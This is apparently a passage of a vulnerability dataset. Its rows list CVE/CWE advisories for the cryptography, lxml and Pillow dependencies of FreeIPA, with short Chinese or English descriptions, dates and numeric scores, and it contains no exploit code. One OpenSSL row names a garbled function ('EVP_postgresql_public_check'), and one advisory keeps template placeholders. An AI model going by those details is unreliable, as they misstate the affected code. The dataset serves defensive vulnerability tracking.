- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
freeipa_freeipa,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
freeipa_freeipa,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
freeipa_freeipa,lxml,,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
freeipa_freeipa,lxml,,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
freeipa_freeipa,lxml,,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
freeipa_freeipa,lxml,,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
freeipa_freeipa,lxml,,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
freeipa_freeipa,lxml,,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
freeipa_freeipa,lxml,,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
freeipa_freeipa,lxml,,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
freeipa_freeipa,pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
freeipa_freeipa,pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
freeipa_freeipa,pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
freeipa_freeipa,pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
freeipa_freeipa,pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
freeipa_freeipa,pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
freeipa_freeipa,pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
freeipa_freeipa,pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
freeipa_freeipa,pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
freeipa_freeipa,pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
freeipa_freeipa,pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
freeipa_freeipa,pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
freeipa_freeipa,pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
freeipa_freeipa,pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
freeipa_freeipa,pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
freeipa_freeipa,pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
freeipa_freeipa,pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
freeipa_freeipa,pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
freeipa_freeipa,pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
freeipa_freeipa,pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
freeipa_freeipa,pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
freeipa_freeipa,pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
freeipa_freeipa,pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
freeipa_freeipa,pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
freeipa_freeipa,pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
freeipa_freeipa,pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
freeipa_freeipa,pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
freeipa_freeipa,pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
freeipa_freeipa,pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
freeipa_freeipa,pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
freeipa_freeipa,pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
freeipa_freeipa,pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
freeipa_freeipa,pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
freeipa_freeipa,pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
freeipa_freeipa,pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
freeipa_freeipa,pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
freeipa_freeipa,pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
freeipa_freeipa,pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
freeipa_freeipa,pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
freeipa_freeipa,pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
freeipa_freeipa,pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
freeipa_freeipa,pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
freeipa_freeipa,pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
freeipa_freeipa,pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
freeipa_freeipa,pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
freeipa_freeipa,pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
freeipa_freeipa,pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
freeipa_freeipa,pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
freeipa_freeipa,pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
freeipa_freeipa,pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
freeipa_freeipa,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
